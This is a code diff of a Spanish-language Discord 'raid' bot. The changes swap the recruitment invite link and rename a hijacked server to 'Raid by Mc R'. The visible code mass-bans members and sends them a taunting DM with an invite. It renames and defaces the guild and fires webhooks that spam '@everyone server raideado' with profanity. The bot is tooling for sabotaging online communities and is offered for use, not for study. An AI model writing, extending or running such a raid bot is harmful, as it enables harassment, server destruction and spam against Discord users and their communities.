@@ -98,7 +98,7 @@ async def banpro(ctx):
     if not ctx.author.guild_permissions.ban_members: return
     if not ctx.guild.me.guild_permissions.ban_members: return
     
-    mensaje_dm = "Mi bot te baneo de tu servidor 😂 quieres hacerlo? Unete aqui https://discord.gg/aACMXB4HSp"
+    mensaje_dm = "Mi bot te baneo de tu servidor 😂 quieres hacerlo? Unete aqui https://discord.gg/pRnwdc3gQj"
     gif_file = await obtener_gif_file()
     
     targets = [
@@ -214,7 +214,7 @@ async def rnServers(ctx):
     if not ctx.guild.me.guild_permissions.manage_guild: return
 
     try:
-        await ctx.guild.edit(name="Mc R", description="Server dominado.")
+        await ctx.guild.edit(name="Raid by Mc R", description="Server raideado.")
         gif_file = await obtener_gif_file()
         if gif_file: await ctx.send(file=gif_file)
     except:
@@ -351,7 +351,7 @@ async def hookpro(ctx):
     channels = ctx.guild.text_channels
     if not channels: return
 
-    mensaje_webhook = "@everyone server raideado putoooos https://discord.gg/aACMXB4HSp"
+    mensaje_webhook = "@everyone server raideado putoooos https://discord.gg/pRnwdc3gQj"
     gif_file = await obtener_gif_file()
 
     async def launch_webhook(channel):
